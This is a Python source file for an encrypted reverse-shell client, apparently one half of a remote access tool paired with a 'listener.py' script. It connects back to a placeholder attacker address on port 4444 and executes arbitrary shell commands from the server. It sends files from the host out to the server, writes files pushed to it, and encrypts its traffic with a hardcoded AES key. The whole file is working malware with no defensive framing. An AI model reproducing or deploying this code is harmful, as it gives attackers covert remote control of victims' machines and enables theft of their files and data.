import socket
import os
import subprocess
import time
import base64
from Cryptodome.Cipher import AES

# --- Configuration ---
SERVER_IP = 'your.attacker.ip' # <-- IMPORTANT: CHANGE THIS
SERVER_PORT = 4444
# IMPORTANT: This key MUST match the key in the listener.py script
AES_KEY = b'DeusExSophia#137' # 16-byte key

# --- AES Encryption/Decryption Functions ---
# These functions must be identical in both listener and client scripts.

def aes_encrypt(data, key):
    """Encrypts data using AES-GCM."""
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    encrypted_payload = base64.b64encode(cipher.nonce + tag + ciphertext)
    return encrypted_payload

def aes_decrypt(encrypted_payload, key):
    """Decrypts data using AES-GCM."""
    try:
        encrypted_data = base64.b64decode(encrypted_payload)
        nonce = encrypted_data[:16]
        tag = encrypted_data[16:32]
        ciphertext = encrypted_data[32:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except (ValueError, KeyError):
        return None

# --- Main Client Logic ---

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except socket.error:
            time.sleep(5) # Wait 5 seconds before retrying

def main():
    s = connect_to_server()
    
    while True:
        try:
            encrypted_cmd = s.recv(1024)
            if not encrypted_cmd:
                s = connect_to_server()
                continue
                
            cmd_bytes = aes_decrypt(encrypted_cmd, AES_KEY)
            if not cmd_bytes:
                continue # Decryption failed, wait for next command
                
            cmd = cmd_bytes.decode().strip()

            if cmd == 'exit':
                s.close()
                break

            # --- Change Directory Functionality ---
            if cmd.startswith('cd '):
                try:
                    path = cmd.split(' ', 1)[1]
                    os.chdir(path)
                    output = os.getcwd()
                except FileNotFoundError:
                    output = f"Directory not found: {path}"
                except Exception as e:
                    output = str(e)
                
                encrypted_output = aes_encrypt(output.encode(), AES_KEY)
                s.send(encrypted_output)

            # --- Download Functionality ---
            elif cmd.startswith('download '):
                try:
                    filepath = cmd.split(' ', 1)[1]
                    with open(filepath, 'rb') as f:
                        file_data = f.read()
                    encrypted_file = aes_encrypt(file_data, AES_KEY)
                    s.send(encrypted_file)
                except FileNotFoundError:
                    error_msg = b"ERROR: File not found."
                    s.send(aes_encrypt(error_msg, AES_KEY))
                except Exception as e:
                    error_msg = f"ERROR: {str(e)}".encode()
                    s.send(aes_encrypt(error_msg, AES_KEY))

            # --- Upload Functionality ---
            elif cmd.startswith('upload '):
                try:
                    # 1. Confirm readiness to receive file
                    s.send(aes_encrypt(b"OK", AES_KEY))
                    
                    # 2. Receive file data
                    encrypted_file = s.recv(40960) # Increased buffer for file data
                    file_data = aes_decrypt(encrypted_file, AES_KEY)
                    
                    # 3. Write file to disk
                    _, _, remote_path = cmd.split(" ", 2)
                    with open(remote_path, 'wb') as f:
                        f.write(file_data)
                    output = f"File successfully uploaded to {remote_path}"

                except Exception as e:
                    output = f"Upload failed: {str(e)}"
                
                encrypted_output = aes_encrypt(output.encode(), AES_KEY)
                s.send(encrypted_output)

            # --- Standard Command Execution ---
            else:
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = proc.stdout + proc.stderr
                if not output:
                    output = "[+] Command executed with no output."
                
                encrypted_output = aes_encrypt(output.encode(), AES_KEY)
                s.send(encrypted_output)
                
        except (ConnectionResetError, BrokenPipeError, socket.error):
            s.close()
            s = connect_to_server()
        except Exception:
            # Catch other potential errors to keep the client alive
            s.close()
            s = connect_to_server()


if __name__ == "__main__":
    main()
